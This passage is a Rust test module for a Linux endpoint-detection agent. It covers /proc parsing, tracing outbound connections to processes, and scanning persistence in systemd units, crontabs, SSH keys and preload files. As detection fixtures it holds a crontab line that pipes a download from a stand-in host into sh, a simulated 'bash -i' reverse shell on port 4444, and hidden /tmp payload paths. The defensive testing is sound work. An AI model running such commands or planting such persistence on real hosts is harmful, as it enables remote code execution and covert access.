#[cfg(test)]
mod tests {
    use crate::{collector, files, host, packages, service};
    use signal_hook::consts::{SIGINT, SIGTERM};
    use std::os::unix::fs::PermissionsExt;
    use std::path::PathBuf;
    use zedr_shared::StopReason;

    fn test_dir(name: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("zedr-linux-{}-{}", std::process::id(), name));
        let _ = std::fs::remove_dir_all(&dir);
        dir
    }

    fn mode(path: &Path) -> u32 {
        std::fs::metadata(path).unwrap().permissions().mode() & 0o777
    }

    use std::collections::HashMap;
    use std::io::Write;
    use std::net::{TcpListener, TcpStream};
    use std::path::Path;
    use std::process::{Command, Stdio};
    use std::time::{Duration, Instant, SystemTime, UNIX_EPOCH};
    use zedr_shared::sensor::{ProcessKey, Sensor, Socket, Source};
    use zedr_shared::{ProcessAction, ProcessEvent, SystemEvent};

    const STAT: &str = "4242 (tmux: server) S 1 4242 4242 0 -1 4194560 1139 0 0 0 5 3 0 0 20 0 1 0 987654 12345678 900 18446744073709551615 187650 187660 281474000000000 0 0 0 0 4096 134433281 0 0 0 17 3 0 0 0 0 0 187670 187680 187690 281474000001111 281474000001222 281474000001222 281474000001333 0";

    #[test]
    fn test_stat_is_read_past_a_name_with_spaces_and_brackets() {
        let stat = collector::parse_stat(STAT).unwrap();
        assert_eq!(stat.ppid, 1);
        assert_eq!(stat.start_ticks, 987654);
        assert!(!stat.kernel_thread);
        assert!(!stat.exited);

        let tricky = STAT.replace("(tmux: server)", "(a) R 9 (b)");
        assert_eq!(collector::parse_stat(&tricky).unwrap().ppid, 1);

        assert_eq!(collector::parse_stat("not a stat line"), None);
        assert_eq!(collector::parse_stat("1 (cut) S 0"), None);
    }

    #[test]
    fn test_kernel_threads_and_exited_processes_are_marked() {
        let kernel_thread = "2 (kthreadd) S 0 0 0 0 -1 2129984 0 0 0 0 0 0 0 0 20 0 1 0 2 0 0 18446744073709551615 0 0 0 0 0 0 0 2147483647 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0";
        assert!(collector::parse_stat(kernel_thread).unwrap().kernel_thread);

        let zombie = STAT.replace(") S 1 ", ") Z 1 ");
        assert!(collector::parse_stat(&zombie).unwrap().exited);
    }

    #[test]
    fn test_exec_changes_the_image_and_time_does_not() {
        let before = collector::parse_stat(STAT).unwrap();
        let later = collector::parse_stat(&STAT.replace(" 5 3 0 0 20 ", " 77 31 0 0 20 ")).unwrap();
        assert_eq!(before.image, later.image, "cpu time passing is not a new image");

        let renamed = collector::parse_stat(&STAT.replace("(tmux: server)", "(nc)")).unwrap();
        assert_ne!(before.image, renamed.image);

        let same_name_new_program = collector::parse_stat(&STAT.replace("281474000001111", "281474000009999")).unwrap();
        assert_ne!(before.image, same_name_new_program.image, "exec of a program with the same name moves the arguments");
        assert_eq!(before.start_ticks, same_name_new_program.start_ticks);
    }

    #[test]
    fn test_uid_command_line_and_boot_time_are_parsed() {
        assert_eq!(collector::parse_uid("Name:\tbash\nUid:\t1000\t0\t0\t0\nGid:\t1000\t1000\t1000\t1000\n"), Some(1000));
        assert_eq!(collector::parse_uid("Name:\tbash\n"), None);

        assert_eq!(collector::parse_command_line(b"/bin/sh\0-c\0echo hi there\0"), vec!["/bin/sh", "-c", "echo hi there"]);
        assert!(collector::parse_command_line(b"").is_empty());
        let long = vec![b'a'; 10_000];
        assert_eq!(collector::parse_command_line(&long)[0].len(), 4096);

        assert_eq!(collector::parse_boot_time("cpu  1 2 3\nbtime 1794780000\nprocesses 5\n"), Some(1794780000));
        assert_eq!(collector::parse_boot_time("cpu  1 2 3\n"), None);
    }

    #[test]
    fn test_socket_and_namespace_links_are_parsed() {
        assert_eq!(collector::parse_socket_link("socket:[48213]"), Some(48213));
        assert_eq!(collector::parse_socket_link("pipe:[48213]"), None);
        assert_eq!(collector::parse_socket_link("/dev/null"), None);
        assert_eq!(collector::parse_namespace_link("net:[4026531840]"), Some(4026531840));
        assert_eq!(collector::parse_namespace_link("mnt:[4026531840]"), None);
    }

    const TCP_TABLE: &str = "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 00000000:1F90 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 1001 1 0000000000000000 100 0 0 10 0
   1: 0500000A:1F90 0900000A:D431 01 00000000:00000000 00:00000000 00000000     0        0 1002 1 0000000000000000 20 4 30 10 -1
   2: 0500000A:9C40 077100CB:115C 01 00000000:00000000 02:000A7214 00000000  1000        0 1003 2 0000000000000000 20 4 30 10 -1
   3: 0500000A:9C41 0A7100CB:01BB 06 00000000:00000000 03:00000F4B 00000000     0        0 0 3 0000000000000000
   4: 0100007F:9C42 0100007F:1538 01 00000000:00000000 00:00000000 00000000  1000        0 1004 1 0000000000000000 20 4 30 10 -1
   5: 0500000A:9C43 087100CB:0050 02 00000000:00000000 01:00000064 00000000  1000        0 1005 2 0000000000000000 100 0 0 10 -1
";

    const TCP6_TABLE: &str = "  sl  local_address                         remote_address                        st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode
   0: 0000000000000000FFFF00000500000A:9C50 0000000000000000FFFF00000B7100CB:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 1006 1 0000000000000000 20 4 30 10 -1
   1: B80D0120000000000000000001000000:9C51 B80D0120000000000000000002000000:01BB 01 00000000:00000000 00:00000000 00000000  1000        0 1007 1 0000000000000000 20 4 30 10 -1
";

    #[test]
    fn test_tcp_table_addresses_are_decoded() {
        let rows = collector::parse_tcp_table(TCP_TABLE);
        assert_eq!(rows.len(), 6);
        assert_eq!(rows[0].local.to_string(), "0.0.0.0:8080");
        assert_eq!(rows[0].state, 0x0A);
        assert_eq!(rows[2].local.to_string(), "10.0.0.5:40000");
        assert_eq!(rows[2].remote.to_string(), "203.0.113.7:4444");
        assert_eq!(rows[2].inode, 1003);

        let v6 = collector::parse_tcp_table(TCP6_TABLE);
        assert_eq!(v6[0].remote.to_string(), "203.0.113.11:443", "a mapped address is shown as IPv4");
        assert_eq!(v6[1].local.to_string(), "[2001:db8::1]:40017");
        assert_eq!(v6[1].remote.to_string(), "[2001:db8::2]:443");
    }

    #[test]
    fn test_only_live_connections_the_host_opened_count_as_outbound() {
        let outbound = collector::outbound(collector::parse_tcp_table(TCP_TABLE));
        let inodes: Vec<u64> = outbound.iter().map(|socket| socket.inode).collect();
        assert_eq!(inodes, vec![1003, 1004, 1005], "listener, accepted connection and time-wait leftovers are left out");
    }

    struct FakeProcess<'a> {
        pid: u32,
        stat: &'a str,
        uid: u32,
        command_line: &'a [u8],
        exe: &'a str,
        namespace: u64,
        sockets: &'a [u64],
    }

    fn fake_process(root: &Path, process: FakeProcess) {
        let dir = root.join(process.pid.to_string());
        std::fs::create_dir_all(dir.join("fd")).unwrap();
        std::fs::create_dir_all(dir.join("ns")).unwrap();
        std::fs::create_dir_all(dir.join("net")).unwrap();
        std::fs::write(dir.join("stat"), process.stat.replacen("4242", &process.pid.to_string(), 1)).unwrap();
        std::fs::write(dir.join("status"), format!("Name:\tx\nUid:\t{0}\t{0}\t{0}\t{0}\n", process.uid)).unwrap();
        std::fs::write(dir.join("cmdline"), process.command_line).unwrap();
        std::os::unix::fs::symlink(process.exe, dir.join("exe")).unwrap();
        std::os::unix::fs::symlink(format!("net:[{}]", process.namespace), dir.join("ns/net")).unwrap();
        std::os::unix::fs::symlink("/dev/null", dir.join("fd/0")).unwrap();
        for (index, inode) in process.sockets.iter().enumerate() {
            std::os::unix::fs::symlink(format!("socket:[{}]", inode), dir.join(format!("fd/{}", index + 3))).unwrap();
        }
    }

    #[test]
    fn test_process_tree_and_connections_are_read_from_a_proc_tree() {
        let root = test_dir("proc-tree");
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("stat"), "cpu  1 2 3\nbtime 1000000\n").unwrap();
        std::fs::create_dir_all(root.join("self")).unwrap();
        std::fs::create_dir_all(root.join("sys")).unwrap();

        let child_of_sshd = STAT.replace(") S 1 ", ") S 100 ");
        let zombie = STAT.replace(") S 1 ", ") Z 200 ");
        let other_namespace = STAT.replace("987654", "999999");
        let kernel_thread = "4242 (kthreadd) S 0 0 0 0 -1 2129984 0 0 0 0 0 0 0 0 20 0 1 0 2 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0";

        fake_process(
            &root,
            FakeProcess { pid: 100, stat: STAT, uid: 0, command_line: b"/usr/sbin/sshd\0-D\0", exe: "/usr/sbin/sshd", namespace: 1, sockets: &[1001, 1002] },
        );
        fake_process(
            &root,
            FakeProcess { pid: 200, stat: &child_of_sshd, uid: 1000, command_line: b"bash\0-i\0", exe: "/usr/bin/bash", namespace: 1, sockets: &[1003] },
        );
        fake_process(&root, FakeProcess { pid: 300, stat: &zombie, uid: 1000, command_line: b"", exe: "/usr/bin/gone", namespace: 1, sockets: &[] });
        fake_process(&root, FakeProcess { pid: 2, stat: kernel_thread, uid: 0, command_line: b"", exe: "/nonexistent", namespace: 1, sockets: &[] });
        fake_process(
            &root,
            FakeProcess { pid: 400, stat: &other_namespace, uid: 0, command_line: b"nginx\0", exe: "/usr/sbin/nginx", namespace: 2, sockets: &[1003] },
        );
        for pid in [100, 200] {
            std::fs::write(root.join(pid.to_string()).join("net/tcp"), TCP_TABLE).unwrap();
            std::fs::write(root.join(pid.to_string()).join("net/tcp6"), TCP6_TABLE).unwrap();
        }
        std::fs::write(root.join("400/net/tcp"), TCP_TABLE.lines().next().unwrap()).unwrap();

        let mut source = collector::ProcSource::new(&root).unwrap();

        let keys = source.processes().unwrap();
        assert_eq!(keys.iter().map(|key| key.pid).collect::<Vec<u32>>(), vec![100, 200, 400], "kernel threads and zombies are left out");

        let bash = source.describe(&keys[1]).unwrap();
        assert_eq!(bash.ppid, 100);
        assert_eq!(bash.uid, 1000);
        assert_eq!(bash.executable_path, "/usr/bin/bash");
        assert_eq!(bash.command_line, vec!["bash", "-i"]);
        assert_eq!(bash.started_at, 1_000_000 + 9_876);

        let reused = ProcessKey { pid: 200, started: 1, image: keys[1].image };
        assert_eq!(source.describe(&reused), None, "a pid that now belongs to another process is not described");

        let sockets = source.outbound_sockets().unwrap();
        let mut inodes: Vec<u64> = sockets.iter().map(|socket| socket.inode).collect();
        inodes.sort_unstable();
        assert_eq!(inodes, vec![1003, 1004, 1005, 1006, 1007]);

        let reverse_shell: Vec<Socket> = sockets.into_iter().filter(|socket| socket.inode == 1003).collect();
        let holders = source.socket_holders(&reverse_shell);
        assert_eq!(holders, HashMap::from([(1003, vec![200])]), "a process in another network namespace is not searched");

        std::fs::remove_dir_all(&root).unwrap();
    }

    fn real_proc() -> collector::ProcSource {
        collector::ProcSource::new(Path::new("/proc")).unwrap()
    }

    fn now() -> u64 {
        SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_secs()
    }

    #[test]
    fn test_agent_finds_and_describes_itself_in_the_real_process_list() {
        let mut source = real_proc();
        let keys = source.processes().unwrap();
        let own = keys.iter().find(|key| key.pid == std::process::id()).expect("own process is listed");

        let details = source.describe(own).unwrap();
        assert_eq!(details.executable_path, std::env::current_exe().unwrap().to_string_lossy());
        assert_eq!(details.command_line, std::env::args().collect::<Vec<String>>());
        assert_eq!(details.uid, host::own_uid().unwrap());
        assert!(keys.iter().any(|key| key.pid == details.ppid), "the parent is in the same list");
        assert!(details.started_at <= now() && details.started_at + 600 > now(), "start time {} is not close to now {}", details.started_at, now());
    }

    fn process_events(events: Vec<SystemEvent>, pid: u32) -> Vec<ProcessEvent> {
        events
            .into_iter()
            .filter_map(|event| match event {
                SystemEvent::Process(process) if process.pid == pid => Some(process),
                _ => None,
            })
            .collect()
    }

    fn poll_until(sensor: &mut Sensor<collector::ProcSource>, pid: u32, wanted: impl Fn(&ProcessEvent) -> bool) -> ProcessEvent {
        let deadline = Instant::now() + Duration::from_secs(10);
        loop {
            if let Some(found) = process_events(sensor.poll(now()).events, pid).into_iter().find(|event| wanted(event)) {
                return found;
            }
            assert!(Instant::now() < deadline, "the expected process event never appeared");
            std::thread::sleep(Duration::from_millis(50));
        }
    }

    #[test]
    fn test_real_child_process_is_seen_starting_changing_image_and_ending() {
        let mut sensor = Sensor::new(real_proc(), std::process::id(), 60, 300);
        sensor.poll(now());

        let mut child = Command::new("/bin/sh").args(["-c", "read line; exec sleep 300"]).stdin(Stdio::piped()).spawn().unwrap();
        let pid = child.id();

        let created = poll_until(&mut sensor, pid, |event| matches!(event.action, ProcessAction::Create));
        assert_eq!(created.ppid, std::process::id());
        assert_eq!(created.command_line, vec!["/bin/sh", "-c", "read line; exec sleep 300"]);
        assert_eq!(created.uid, host::own_uid().unwrap());
        assert!(created.timestamp + 60 > now());

        child.stdin.take().unwrap().write_all(b"go\n").unwrap();
        let changed = poll_until(&mut sensor, pid, |event| matches!(event.action, ProcessAction::Modify));
        assert_eq!(changed.command_line, vec!["sleep", "300"]);
        assert!(changed.executable_path.contains("sleep") || changed.executable_path.contains("busybox"), "unexpected image {}", changed.executable_path);

        child.kill().unwrap();
        child.wait().unwrap();
        let ended = poll_until(&mut sensor, pid, |event| matches!(event.action, ProcessAction::Terminate));
        assert_eq!(ended.command_line, vec!["sleep", "300"]);
    }

    #[test]
    fn test_real_connection_is_listed_as_outbound_and_traced_to_this_process() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let client = TcpStream::connect(listener.local_addr().unwrap()).unwrap();
        let (_accepted, _) = listener.accept().unwrap();

        let mut source = real_proc();
        source.processes().unwrap();
        let sockets = source.outbound_sockets().unwrap();

        let ours: Vec<Socket> =
            sockets.iter().filter(|socket| socket.local == client.local_addr().unwrap() && socket.remote == listener.local_addr().unwrap()).cloned().collect();
        assert_eq!(ours.len(), 1, "the connecting end is listed once");
        assert!(sockets.iter().all(|socket| socket.local.port() != listener.local_addr().unwrap().port()), "the accepting end is not outbound");

        let holders = source.socket_holders(&ours);
        assert_eq!(holders.get(&ours[0].inode), Some(&vec![std::process::id()]));
    }

    #[test]
    fn test_get_kernel_version() {
        assert!(host::kernel_version().is_some());
    }

    #[test]
    fn test_host_is_described_for_registration() {
        let host = host::describe();
        assert!(!host.hostname.is_empty());
        assert!(host.os_version.contains("kernel"));
        assert_eq!(host.agent_version, env!("CARGO_PKG_VERSION"));
    }

    #[test]
    fn test_distribution_name_is_read_from_os_release() {
        let os_release = "NAME=\"Ubuntu\"\nVERSION_ID=\"24.04\"\nPRETTY_NAME=\"Ubuntu 24.04.1 LTS\"\nID=ubuntu\n";
        assert_eq!(host::distribution_name(os_release).as_deref(), Some("Ubuntu 24.04.1 LTS"));
        assert_eq!(host::distribution_name("PRETTY_NAME=Alpine\n").as_deref(), Some("Alpine"));
        assert_eq!(host::distribution_name("PRETTY_NAME='Amazon Linux 2023'\n").as_deref(), Some("Amazon Linux 2023"));
        assert_eq!(host::distribution_name("NAME=Linux\nPRETTY_NAME=\"\"\n"), None);
        assert_eq!(host::distribution_name(""), None);
    }

    #[test]
    fn test_state_directory_is_created_for_its_owner_only() {
        let dir = test_dir("state-new").join("nested");
        host::ensure_private_dir(&dir).unwrap();
        assert_eq!(mode(&dir), 0o700);
        std::fs::remove_dir_all(dir.parent().unwrap()).unwrap();
    }

    #[test]
    fn test_state_directory_open_to_others_is_closed() {
        let dir = test_dir("state-open");
        std::fs::create_dir_all(&dir).unwrap();
        std::fs::set_permissions(&dir, std::fs::Permissions::from_mode(0o755)).unwrap();

        host::ensure_private_dir(&dir).unwrap();

        assert_eq!(mode(&dir), 0o700);
        std::fs::remove_dir_all(&dir).unwrap();
    }

    #[test]
    fn test_state_directory_behind_a_symlink_or_a_file_is_refused() {
        let target = test_dir("state-target");
        std::fs::create_dir_all(&target).unwrap();
        let link = test_dir("state-link");
        std::os::unix::fs::symlink(&target, &link).unwrap();
        assert!(host::ensure_private_dir(&link).unwrap_err().contains("not a directory"));

        let file = target.join("file");
        std::fs::write(&file, "x").unwrap();
        assert!(host::ensure_private_dir(&file).unwrap_err().contains("not a directory"));

        std::fs::remove_file(&link).unwrap();
        std::fs::remove_dir_all(&target).unwrap();
    }

    #[test]
    fn test_state_directory_of_another_user_is_refused() {
        if host::own_uid().unwrap() == 0 {
            let dir = test_dir("state-foreign");
            std::fs::create_dir_all(&dir).unwrap();
            std::os::unix::fs::chown(&dir, Some(12345), None).unwrap();
            assert!(host::ensure_private_dir(&dir).unwrap_err().contains("belongs to user 12345"));
            std::fs::remove_dir_all(&dir).unwrap();
        } else {
            assert!(host::ensure_private_dir(std::path::Path::new("/")).unwrap_err().contains("belongs to user 0"));
        }
    }

    #[test]
    fn test_sigterm_during_shutdown_is_a_shutdown_and_otherwise_a_stop() {
        assert_eq!(service::stop_reason(SIGTERM, Ok(true)), StopReason::SystemShutdown);
        assert_eq!(service::stop_reason(SIGTERM, Ok(false)), StopReason::ServiceStop);
    }

    #[test]
    fn test_stop_is_reported_when_the_system_state_is_unknown() {
        assert_eq!(service::stop_reason(SIGTERM, Err("no systemd".to_string())), StopReason::ServiceStop);
    }

    #[test]
    fn test_interrupt_is_never_a_shutdown() {
        assert_eq!(service::stop_reason(SIGINT, Ok(true)), StopReason::ServiceStop);
    }

    use crate::persistence::{self, CronEntry};
    use sha2::{Digest, Sha256};
    use zedr_shared::sensor::PersistenceItem;
    use zedr_shared::{InventoryAction, PersistenceKind};

    const PASSWD: &str = "root:x:0:0:root:/root:/bin/bash\ndana:x:1000:1000::/home/dana:/bin/zsh\n";
    const ED25519_KEY: &str = "AAAAC3NzaC1lZDI1NTE5AAAAIKhakgEouqfK6smUqU2sY0O1i5Xj6lq+6llCBtQfPYeO";
    const ED25519_FINGERPRINT: &str = "SHA256:qyZYFDs7jXkFw3lnFg23jK1InOXW7kSZfPKbC/4mEWc";
    const RSA_KEY: &str = "AAAAB3NzaC1yc2EAAAADAQABAAABAQDqFW2kVcjA2zcCf+gw4A+Yfs7lKoFfRzpk+in+zkBsEzaw9Sv3Z/Ei9sw0ru4ePZFjWzuqPVkyikD1VwkiODB6ahcjjCXx8ViY01f4RjuI8VQKn0GgBDNmugBuOmZeO5B2kDlOz9OGd94RcIQBocTzQZJ3BIdVYxXYDunyWRdeWPbGo89g9qbPck+tTkYs+fgx7A74kChGlxaQobC/1NA1LnMv9+BzPuOvnZD62vVf+hRqPj3Q6eptK1pMdLuwncaWpNDH0VkE86jHgVciiUVFV9cWplCp5IoN+aHK4E+6/bybK37BcgvMJIAjfzBYA2onS5c79Nt51BxYyQl6hUbR";
    const RSA_FINGERPRINT: &str = "SHA256:qNpsBn/8APvjPWik3bwhZK9tYTEcIAFwK08Cjib/FjY";

    struct Tree {
        proc_root: PathBuf,
    }

    impl Tree {
        fn new(name: &str) -> Self {
            let tree = Self { proc_root: test_dir(name) };
            std::fs::create_dir_all(tree.root().join("etc")).unwrap();
            std::fs::write(tree.proc_root.join("stat"), "cpu  1 2 3\nbtime 1000000\n").unwrap();
            tree
        }

        fn root(&self) -> PathBuf {
            self.proc_root.join("1/root")
        }

        fn at(&self, path: &str) -> PathBuf {
            self.root().join(path.trim_start_matches('/'))
        }

        fn write(&self, path: &str, contents: &str) {
            let file = self.at(path);
            std::fs::create_dir_all(file.parent().unwrap()).unwrap();
            std::fs::write(file, contents).unwrap();
        }

        fn executable(&self, path: &str, contents: &str) {
            self.write(path, contents);
            std::fs::set_permissions(self.at(path), std::fs::Permissions::from_mode(0o755)).unwrap();
        }

        fn link(&self, path: &str, target: &str) {
            let link = self.at(path);
            std::fs::create_dir_all(link.parent().unwrap()).unwrap();
            std::os::unix::fs::symlink(target, link).unwrap();
        }

        fn remove(&self, path: &str) {
            std::fs::remove_file(self.at(path)).unwrap();
        }

        fn scan(&self) -> Vec<PersistenceItem> {
            persistence::scan(&self.root()).unwrap()
        }

        fn of(&self, kind: PersistenceKind) -> Vec<PersistenceItem> {
            self.scan().into_iter().filter(|item| item.kind == kind).collect()
        }
    }

    impl Drop for Tree {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.proc_root);
        }
    }

    fn sha256(contents: &str) -> Option<String> {
        Some(hex::encode(Sha256::digest(contents.as_bytes())))
    }

    fn listed(kind: PersistenceKind, name: &str, path: &str, command: &str, user: &str, enabled: bool, hash: Option<String>) -> PersistenceItem {
        PersistenceItem { kind, name: name.to_string(), path: path.to_string(), command: command.to_string(), user: user.to_string(), enabled, hash }
    }

    #[test]
    fn test_unit_commands_user_and_timer_target_are_parsed() {
        let unit = persistence::parse_unit(&[concat!(
            "# managed by hand\n",
            "[Unit]\n",
            "Description=Backup\n",
            "ExecStart=/not/in/the/service/section\n",
            "\n",
            "[Service]\n",
            "User=backup\n",
            "ExecStart=/usr/bin/backup \\\n",
            "    --all \\\n",
            "    --quiet\n",
            "; a comment in the other style\n",
            "ExecStart=-/usr/bin/notify done\n",
            "ExecStop=/usr/bin/cleanup\n",
        )]);
        assert_eq!(unit.exec_start, vec!["/usr/bin/backup --all --quiet", "-/usr/bin/notify done"]);
        assert_eq!(unit.user.as_deref(), Some("backup"));
        assert_eq!(unit.activates, None);

        let timer = persistence::parse_unit(&["[Timer]\nOnCalendar=daily\nUnit=backup.service\n"]);
        assert_eq!(timer.activates.as_deref(), Some("backup.service"));
        assert!(timer.exec_start.is_empty());
    }

    #[test]
    fn test_drop_in_adds_to_or_replaces_the_commands_of_a_unit() {
        let unit = "[Service]\nExecStart=/usr/sbin/sshd -D\n";

        let added = persistence::parse_unit(&[unit, "[Service]\nExecStart=/tmp/.x\n"]);
        assert_eq!(added.exec_start, vec!["/usr/sbin/sshd -D", "/tmp/.x"]);

        let replaced = persistence::parse_unit(&[unit, "[Service]\nExecStart=\nExecStart=/tmp/.y\nUser=nobody\n"]);
        assert_eq!(replaced.exec_start, vec!["/tmp/.y"]);
        assert_eq!(replaced.user.as_deref(), Some("nobody"));
    }

    fn cron_entry(entry: &str, user: Option<&str>, command: &str) -> CronEntry {
        CronEntry { entry: entry.to_string(), user: user.map(str::to_string), command: command.to_string() }
    }

    #[test]
    fn test_system_crontab_lines_name_a_schedule_a_user_and_a_command() {
        let entries = persistence::parse_crontab(
            concat!(
                "# m h dom mon dow user command\n",
                "SHELL=/bin/sh\n",
                "PATH=/usr/sbin:/usr/bin\n",
                "\n",
                "17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n",
                "@reboot  www-data  /srv/start.sh --now\n",
                "-*/5 * * * * root /usr/bin/quiet\n",
                "* * * * *\n",
                "* * * * * root\n",
                "not a cron line\n",
            ),
            true,
        );

        assert_eq!(
            entries,
            vec![
                cron_entry("17 * * * * root cd / && run-parts --report /etc/cron.hourly", Some("root"), "cd / && run-parts --report /etc/cron.hourly"),
                cron_entry("@reboot www-data /srv/start.sh --now", Some("www-data"), "/srv/start.sh --now"),
                cron_entry("-*/5 * * * * root /usr/bin/quiet", Some("root"), "/usr/bin/quiet"),
            ]
        );
    }

    #[test]
    fn test_user_crontab_lines_have_no_user_field() {
        let entries =
            persistence::parse_crontab("MAILTO=\"\"\n0 3 * * 1-5 /home/dana/backup.sh > /dev/null 2>&1\n@daily curl -s https://example.test/x | sh\n", false);

        assert_eq!(
            entries,
            vec![
                cron_entry("0 3 * * 1-5 /home/dana/backup.sh > /dev/null 2>&1", None, "/home/dana/backup.sh > /dev/null 2>&1"),
                cron_entry("@daily curl -s https://example.test/x | sh", None, "curl -s https://example.test/x | sh"),
            ]
        );
    }

    #[test]
    fn test_authorized_keys_are_named_by_the_fingerprint_ssh_keygen_prints() {
        let contents = [
            "# deploy keys".to_string(),
            String::new(),
            format!("ssh-ed25519 {} deploy@ci", ED25519_KEY),
            format!(r#"command="/usr/bin/rsync --server \"$SSH_ORIGINAL_COMMAND\", really",no-pty,from="10.0.0.0/8" ssh-rsa {} ops laptop"#, RSA_KEY),
            "ssh-ed25519 not*base64 broken".to_string(),
            "restrict no-key-on-this-line".to_string(),
        ]
        .join("\n");

        let keys = persistence::parse_authorized_keys(&contents);

        assert_eq!(keys.len(), 2, "comments, broken keys and lines without a key are not keys");
        assert_eq!(keys[0].key_type, "ssh-ed25519");
        assert_eq!(keys[0].fingerprint, ED25519_FINGERPRINT);
        assert_eq!(keys[0].comment, "deploy@ci");
        assert_eq!(keys[0].forced_command, "");
        assert_eq!(keys[1].key_type, "ssh-rsa");
        assert_eq!(keys[1].fingerprint, RSA_FINGERPRINT);
        assert_eq!(keys[1].comment, "ops laptop");
        assert_eq!(keys[1].forced_command, r#"/usr/bin/rsync --server "$SSH_ORIGINAL_COMMAND", really"#);
        assert_eq!(keys[0].hash.len(), 64);
        assert_ne!(keys[0].hash, keys[1].hash);
    }

    #[test]
    fn test_preload_file_lists_libraries_separated_by_spaces_colons_or_lines() {
        assert_eq!(
            persistence::parse_preload("# loaded into every process\n/usr/lib/libfirst.so /usr/lib/libsecond.so:/opt/third.so # why\n\n/tmp/.hidden.so\n"),
            vec!["/usr/lib/libfirst.so", "/usr/lib/libsecond.so", "/opt/third.so", "/tmp/.hidden.so"]
        );
        assert!(persistence::parse_preload("\n# nothing\n").is_empty());
    }

    #[test]
    fn test_accounts_are_read_from_passwd_once_per_home() {
        let accounts = persistence::parse_accounts(concat!(
            "root:x:0:0:root:/root:/bin/bash\n",
            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n",
            "bin:x:2:2:bin:/usr/sbin:/usr/sbin/nologin\n",
            "#old:x:9:9::/home/old:/bin/sh\n",
            "broken line\n",
            "dana:x:1000:1000:Dana,,,:/home/dana:/bin/zsh\n",
            "nohome:x:1001:1001:::/bin/sh\n",
        ));

        let homes: Vec<(&str, &Path)> = accounts.iter().map(|account| (account.name.as_str(), account.home.as_path())).collect();
        assert_eq!(homes, vec![("root", Path::new("/root")), ("daemon", Path::new("/usr/sbin")), ("dana", Path::new("/home/dana"))]);
    }

    #[test]
    fn test_start_links_name_the_script_they_start() {
        assert_eq!(persistence::started_by("S01cron").as_deref(), Some("cron"));
        assert_eq!(persistence::started_by("S20network-manager").as_deref(), Some("network-manager"));
        assert_eq!(persistence::started_by("K01cron"), None);
        assert_eq!(persistence::started_by("S99"), None);
        assert_eq!(persistence::started_by("README"), None);
    }

    #[test]
    fn test_links_are_followed_inside_the_inspected_root_only() {
        let tree = Tree::new("locate");
        tree.write("/usr/lib/real.conf", "x");
        tree.link("/lib", "usr/lib");
        tree.link("/etc/absolute.conf", "/usr/lib/real.conf");
        tree.link("/etc/through-a-linked-directory.conf", "/lib/real.conf");
        tree.link("/etc/climbing.conf", "../../../../usr/lib/real.conf");
        tree.link("/etc/loop-a", "loop-b");
        tree.link("/etc/loop-b", "loop-a");

        let real = tree.at("/usr/lib/real.conf");
        for path in [
            "/usr/lib/real.conf",
            "/lib/real.conf",
            "/etc/absolute.conf",
            "/etc/through-a-linked-directory.conf",
            "/etc/climbing.conf",
            "/etc/../usr/lib/real.conf",
        ] {
            assert_eq!(files::locate(&tree.root(), Path::new(path)), Some(real.clone()), "{}", path);
        }

        assert_eq!(files::locate(&tree.root(), Path::new("/etc/loop-a")), None);
        assert_eq!(files::locate(&tree.root(), Path::new("/etc/missing/file")), Some(tree.at("/etc/missing/file")));
    }

    #[test]
    fn test_systemd_units_are_listed_with_command_user_state_and_hash() {
        let tree = Tree::new("systemd");
        let backup = "[Unit]\nDescription=Backup\n\n[Service]\nUser=backup\nExecStart=/usr/local/bin/backup --all\n\n[Install]\nWantedBy=multi-user.target\n";
        let sshd = "[Service]\nExecStart=/usr/sbin/sshd -D\n";
        tree.write("/etc/systemd/system/backup.service", backup);
        tree.link("/etc/systemd/system/multi-user.target.wants/backup.service", "/etc/systemd/system/backup.service");
        tree.write("/usr/lib/systemd/system/ssh.service", sshd);
        tree.write("/usr/lib/systemd/system/multi-user.target", "[Unit]\nDescription=Multi-User System\n");
        tree.link("/lib", "usr/lib");

        assert_eq!(
            tree.scan(),
            vec![
                listed(
                    PersistenceKind::SystemdUnit,
                    "backup.service",
                    "/etc/systemd/system/backup.service",
                    "/usr/local/bin/backup --all",
                    "backup",
                    true,
                    sha256(backup)
                ),
                listed(PersistenceKind::SystemdUnit, "ssh.service", "/usr/lib/systemd/system/ssh.service", "/usr/sbin/sshd -D", "root", false, sha256(sshd)),
            ],
            "a unit nothing wants is not enabled, /lib is /usr/lib and is read once, targets are not listed"
        );
    }

    #[test]
    fn test_unit_state_follows_wants_links_masks_and_shadowing() {
        let tree = Tree::new("systemd-state");
        for name in ["vendor.service", "aliased.service", "masked.service", "shadowed.service", "getty@.service"] {
            tree.write(&format!("/usr/lib/systemd/system/{}", name), "[Service]\nExecStart=/usr/bin/daemon\n");
        }
        tree.link("/usr/lib/systemd/system/sysinit.target.wants/vendor.service", "../vendor.service");
        tree.link("/etc/systemd/system/other-name.service", "/usr/lib/systemd/system/aliased.service");
        tree.link("/etc/systemd/system/masked.service", "/dev/null");
        tree.link("/etc/systemd/system/multi-user.target.wants/masked.service", "/usr/lib/systemd/system/masked.service");
        tree.write("/etc/systemd/system/shadowed.service", "[Service]\nExecStart=/tmp/.replacement\n");
        tree.link("/etc/systemd/system/multi-user.target.wants/shadowed.service", "/etc/systemd/system/shadowed.service");
        tree.link("/etc/systemd/system/getty.target.wants/getty@tty1.service", "/usr/lib/systemd/system/getty@.service");
        tree.write("/opt/app/linked.service", "[Service]\nExecStart=/opt/app/run\n");
        tree.link("/etc/systemd/system/linked.service", "/opt/app/linked.service");

        let state: Vec<(String, String, bool)> = tree.scan().into_iter().map(|item| (item.path, item.command, item.enabled)).collect();
        let expected = [
            ("/etc/systemd/system/linked.service", "/opt/app/run", false),
            ("/etc/systemd/system/shadowed.service", "/tmp/.replacement", true),
            ("/usr/lib/systemd/system/aliased.service", "/usr/bin/daemon", false),
